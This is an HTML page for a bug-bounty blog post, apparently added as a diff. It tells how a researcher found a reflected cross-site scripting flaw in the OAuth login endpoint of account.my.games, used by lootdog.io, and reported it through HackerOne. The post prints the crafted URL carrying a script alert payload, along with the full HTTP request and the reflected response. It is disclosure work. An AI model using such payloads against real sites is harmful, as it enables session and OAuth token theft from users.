@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Discovery of Reflected Cross-Site Scripting (XSS) Vulnerability in a Public Program — thevillagehacker</title>
+  <meta name="description" content="Discovery of Reflected Cross-Site Scripting (XSS) Vulnerability in a Public Program"/>
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,300;0,400;0,500;0,600;1,400&family=Bebas+Neue&display=swap" rel="stylesheet"/>
+  <link rel="stylesheet" href="../assets/css/style.css"/>
+</head>
+<body>
+<div class="page">
+
+  <!-- Navigation -->
+  <nav>
+    <a class="nav-logo" href="../index.html">thevillagehacker</a>
+    <ul class="nav-links">
+      <li><a href="../blog.html">Blog</a></li>
+      <li><a href="../about.html">Whoami</a></li>
+      <li><a href="../changelog.html">Changelog</a></li>
+    </ul>
+  </nav>
+
+  <!-- Post Header -->
+  <div class="post-header">
+    <div class="breadcrumb">
+      <a href="../blog.html">Blog</a><span>→</span>Discovery of Reflected Cross-Site Scripting (XSS) Vulnerability in a Public Program
+    </div>
+    <h1 class="post-title">Discovery of Reflected Cross-Site Scripting (XSS) Vulnerability in a Public Program</h1>
+    <div class="post-meta">
+      <span>2021-02-08</span>
+      <span>Naveen Jagadeesan</span>
+      <span>thevillagehacker</span>
+    </div>
+  </div>
+
+  <!-- Article Body -->
+  <article>
+<p>Reflected Cross-site Scripting.</p>
+<h2>Target</h2>
+<p>The target of this analysis is https://lootdog.io/, a website hosted on HackerOne's platform with a large scope. During the reconnaissance phase, an unintended behavior was identified in the Oauth request, leading to further investigation.</p>
+<h2>Technical Analysis</h2>
+<p>The login request from https://lootdog.io/ was intercepted and analyzed using a repeater tool to observe the Oauth workflow. It was discovered that the website utilizes https://account.my.games as an Oauth service. Upon clicking the login button, users are redirected to https://account.my.games, where they can log in if they possess a valid account. To assess the security of the Oauth implementation, a search was conducted for potential vulnerabilities such as Reflected XSS or Open Redirect issues that could be exploited to obtain the Oauth token and compromise user accounts.</p>
+<p>An additional parameter was added to the end of the request's keyed value as follows:</p>
+<p><code>&amp;Set-Cookie: &lt;script&gt;alert(“Hacked By Deathstroke”)&lt;/script&gt;</code></p>
+<p>The resulting URL was crafted as follows:</p>
+<pre><code>https://account.my.games//oauth2/login/?continue=https%3A%2F%2Faccount.my.games%2Foauth2%2F%3Fredirect_uri%3Dhttps%253A%252F%252Flootdog.io%252Fsocial%252Fcomplete%252Fo2mygames%252F%26client_id%3Dlootdog_io%26response_type%3Dcode%26signup_social%3Dmailru%2Cfb%2Cok%2Cvk%2Cg%2Ctwitch%2Ctw%26signup_method%3Demail%252Cphone%26lang%3DEN&amp;client_id=lootdog_io&amp;lang=EN&amp;signup_method=email%2Cphone&amp;signup_social=mailru%2Cfb%2Cok%2Cvk%2Cg%2Ctwitch%2Ctw&amp;Set-Cookie: &lt;script&gt;alert(&quot;Hacked By Deathstroke&quot;)&lt;/script&gt;
+</code></pre>
+<p>Subsequently, the request containing the payload was sent and the response was observed.</p>
+<h3>Request</h3>
+<pre><code class="language-http">GET /oauth2/login/?continue=https%3A%2F%2Faccount.my.games%2Foauth2%2F%3Fredirect_uri%3Dhttps%253A%252F%252Flootdog.io%252Fsocial%252Fcomplete%252Fo2mygames%252F%26client_id%3Dlootdog_io%26response_type%3Dcode%26signup_social%3Dmailru%2Cfb%2Cok%2Cvk%2Cg%2Ctwitch%2Ctw%26signup_method%3Demail%252Cphone%26lang%3DEN&amp;client_id=lootdog_io&amp;lang=EN&amp;signup_method=email%2Cphone&amp;signup_social=mailru%2Cfb%2Cok%2Cvk%2Cg%2Ctwitch%2Ctw&amp;Set-Cookie: &lt;script&gt;alert(&quot;Hacked By Deathstroke&quot;)&lt;/script&gt; HTTP/1.1 
+Host: account.my.games 
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 
+Accept-Language: en-US,en;q=0.5 
+Accept-Encoding: gzip, deflate 
+Referer: https://lootdog.io/ 
+Connection: close
+</code></pre>
+<h3>Response</h3>
+<pre><code class="language-http">&lt;script&gt;alert(&quot;Hacked By Deathstroke&quot;)&lt;/script&gt; HTTP/1.0 200 OK 
+Content-Type: text/html; charset=utf-8 
+X-Frame-Options: SAMEORIGIN 
+Content-Length: 3982 
+Vary: Origin
+</code></pre>
+<p>However, no access token was found to be reflected in the response at that time. Nonetheless, the issue was reported to the program, as it had the potential to pose other security threats.</p>
+<p><img src="../assets/images/blogs/XSS_lootdog/1.webp" alt="img" /></p>
+<p>The payload can be seen successfully reflected in the HTTP response.</p>
+<p><img src="../assets/images/blogs/XSS_lootdog/2.webp" alt="img" /></p>
+<p>This marked the discovery of my first vulnerability, which was promptly reported to HackerOne. After the HackerOne analyst verified and triaged the vulnerability through discussions, the issue was ultimately resolved, and I was rewarded with a Hall of Fame (HoF) distinction.</p>
+<p>Thank you for reading.</p>
+<p>For more updates and insights, follow me on Twitter: <a href="https://twitter.com/thevillagehackr">@thevillagehacker</a>.</p>
+
+  </article>
+
+  <!-- Post Navigation -->
+  <div class="post-nav">
+    <a href="../blog.html" class="post-nav-link prev"><div class="post-nav-dir">← Previous</div><div class="post-nav-title">Blogs</div></a>
+    <a href="2021-02-11-ato-rate-limiting.html" class="post-nav-link next"><div class="post-nav-dir">Next →</div><div class="post-nav-title">Account Takeover Due to Lack of Rate Limiting Protection</div></a>
+  </div>
+
+  <!-- Footer -->
+  <footer>
+    <span class="footer-text">
+      © 2025 <a href="../index.html">thevillagehacker</a>
+      — Naveen Jagadeesan
+    </span>
+    <span class="footer-text">
+      status: active<span class="blink"></span>
+    </span>
+  </footer>
+
+</div>
+</body>
+</html>
